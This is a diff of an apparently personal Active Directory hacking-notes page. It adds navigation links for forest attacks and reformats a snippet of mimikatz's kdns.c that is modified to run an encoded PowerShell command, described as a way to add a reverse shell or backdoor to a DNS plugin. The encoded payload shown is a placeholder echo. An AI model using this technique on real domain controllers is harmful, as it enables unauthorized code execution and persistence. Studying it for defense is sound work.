@@ -67,6 +67,10 @@
 								
 									<li class="nav-item current"><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
 							</ul>
@@ -583,16 +587,15 @@ sc \\dc01.corp.local start dns
 
 <p>We can modify the source code of <code class="highlighter-rouge">kdns.c</code> from <code class="highlighter-rouge">mimikatz</code> in order to add a reverse shell or other type of backdoor.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#pragma warning(disable:4996)
-	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
-#pragma warning(pop)
-	{
-		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
-		fclose(kdns_logfile);
-		system("C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==")   //THIS LINE
-	}
-	return ERROR_SUCCESS;
-}
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#pragma warning(disable:4996)
+</span>	<span class="k">if</span><span class="p">(</span><span class="n">kdns_logfile</span> <span class="p">=</span> <span class="nf">_wfopen</span><span class="p">(</span><span class="n">L</span><span class="s">"kiwidns.log"</span><span class="p">,</span> <span class="n">L</span><span class="s">"a"</span><span class="p">))</span>
+<span class="cp">#pragma warning(pop)
+</span>	<span class="p">{</span>
+		<span class="nf">klog</span><span class="p">(</span><span class="n">kdns_logfile</span><span class="p">,</span> <span class="n">L</span><span class="s">"%S (%hu)\n"</span><span class="p">,</span> <span class="n">pszQueryName</span><span class="p">,</span> <span class="n">wQueryType</span><span class="p">);</span>
+		<span class="nf">fclose</span><span class="p">(</span><span class="n">kdns_logfile</span><span class="p">);</span>
+		<span class="nf">system</span><span class="p">(</span><span class="s">"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA=="</span><span class="p">)</span>   <span class="c1">//THIS LINE</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">ERROR_SUCCESS</span><span class="p">;</span>
 </code></pre></div></div>
 
 			</article>
